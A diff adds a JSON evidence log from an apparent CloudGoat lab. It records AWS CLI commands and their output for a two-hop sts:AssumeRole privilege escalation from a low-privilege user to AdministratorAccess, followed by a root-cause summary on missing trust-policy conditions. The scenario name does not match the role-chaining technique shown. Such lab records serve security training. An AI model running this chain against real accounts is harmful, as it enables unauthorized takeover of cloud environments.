@@ -1,0 +1,109 @@
+{
+  "task_id": "CSE-AWS-L-027-04",
+  "phase": "Phase C - Core Execution: STS Abuse Simulation",
+  "lab_environment": "CloudGoat scenario: iam_privesc_by_rollback (isolated sandbox account)",
+  "note": "All Account IDs, Access Key IDs, Secret Keys and Session Tokens below are redacted or replaced with example/lab-only values per evidence handling policy.",
+  "session_log": [
+    {
+      "step": 1,
+      "action": "Verify starting identity",
+      "command": "aws sts get-caller-identity --profile cloudgoat",
+      "output": {
+        "UserId": "AIDAEXAMPLE0LABUSER",
+        "Account": "111111111111",
+        "Arn": "arn:aws:iam::111111111111:user/cg-lab-user-solus"
+      },
+      "timestamp": "2026-06-02T09:14:02Z"
+    },
+    {
+      "step": 2,
+      "action": "Enumerate target role and extract its trust policy",
+      "command": "aws iam get-role --role-name cg-lab-role-solus | jq '.Role.AssumeRolePolicyDocument'",
+      "output": {
+        "Version": "2012-10-17",
+        "Statement": [
+          {
+            "Effect": "Allow",
+            "Principal": { "AWS": "arn:aws:iam::111111111111:root" },
+            "Action": "sts:AssumeRole"
+          }
+        ]
+      },
+      "observation": "Trust policy scopes the Principal to the account root ARN with no sts:ExternalId, aws:SourceIp, or MFA condition. Any authenticated IAM principal within the same account can assume this role."
+    },
+    {
+      "step": 3,
+      "action": "Assume first role (privilege-escalation hop 1)",
+      "command": "aws sts assume-role --role-arn arn:aws:iam::111111111111:role/cg-lab-role-solus --role-session-name hop1-session",
+      "output": {
+        "Credentials": {
+          "AccessKeyId": "ASIAEXAMPLEHOP1XXXX",
+          "SecretAccessKey": "[REDACTED]",
+          "SessionToken": "[REDACTED - 1024 char temporary token omitted]",
+          "Expiration": "2026-06-02T10:14:02Z"
+        },
+        "AssumedRoleUser": {
+          "AssumedRoleId": "AROAEXAMPLE0001:hop1-session",
+          "Arn": "arn:aws:iam::111111111111:assumed-role/cg-lab-role-solus/hop1-session"
+        }
+      },
+      "timestamp": "2026-06-02T09:16:41Z"
+    },
+    {
+      "step": 4,
+      "action": "Inspect trust policy of second-hop role using hop-1 temporary credentials",
+      "command": "aws iam get-role --role-name cg-lab-role-console_last_pass_role | jq '.Role.AssumeRolePolicyDocument'",
+      "output": {
+        "Version": "2012-10-17",
+        "Statement": [
+          {
+            "Effect": "Allow",
+            "Principal": { "AWS": "arn:aws:iam::111111111111:role/cg-lab-role-solus" },
+            "Action": "sts:AssumeRole"
+          }
+        ]
+      },
+      "observation": "Second role trusts the first role's ARN directly, again with no ExternalId or session-duration restriction, enabling role chaining."
+    },
+    {
+      "step": 5,
+      "action": "Chain to second role (privilege-escalation hop 2) using hop-1 credentials",
+      "command": "AWS_ACCESS_KEY_ID=ASIAEXAMPLEHOP1XXXX AWS_SECRET_ACCESS_KEY=[REDACTED] AWS_SESSION_TOKEN=[REDACTED] aws sts assume-role --role-arn arn:aws:iam::111111111111:role/cg-lab-role-console_last_pass_role --role-session-name hop2-session",
+      "output": {
+        "Credentials": {
+          "AccessKeyId": "ASIAEXAMPLEHOP2XXXX",
+          "SecretAccessKey": "[REDACTED]",
+          "SessionToken": "[REDACTED - 1024 char temporary token omitted]",
+          "Expiration": "2026-06-02T10:19:47Z"
+        },
+        "AssumedRoleUser": {
+          "AssumedRoleId": "AROAEXAMPLE0002:hop2-session",
+          "Arn": "arn:aws:iam::111111111111:assumed-role/cg-lab-role-console_last_pass_role/hop2-session"
+        }
+      },
+      "timestamp": "2026-06-02T09:19:47Z",
+      "observation": "Second hop succeeded without additional verification, completing a two-hop chain from a low-privilege lab user to a role with broad administrative permissions."
+    },
+    {
+      "step": 6,
+      "action": "Verify permissions reachable at end of chain",
+      "command": "aws iam list-attached-role-policies --role-name cg-lab-role-console_last_pass_role",
+      "output": {
+        "AttachedPolicies": [
+          {
+            "PolicyName": "AdministratorAccess",
+            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
+          }
+        ]
+      },
+      "observation": "Confirms full administrative privilege was reachable in exactly two AssumeRole hops from a low-privilege starting identity, driven entirely by missing trust-policy conditions rather than an application vulnerability."
+    }
+  ],
+  "summary": {
+    "total_hops": 2,
+    "starting_identity": "arn:aws:iam::111111111111:user/cg-lab-user-solus (no directly attached policies)",
+    "ending_privilege": "AdministratorAccess (via cg-lab-role-console_last_pass_role)",
+    "root_cause": "Both trust policies in the chain permitted sts:AssumeRole from a broad Principal (account root / prior role ARN) with no sts:ExternalId, aws:SourceIp, aws:MultiFactorAuthPresent, or sts:DurationSeconds condition.",
+    "mitre_attack_mapping": ["T1078 - Valid Accounts", "T1098 - Account Manipulation"]
+  }
+}
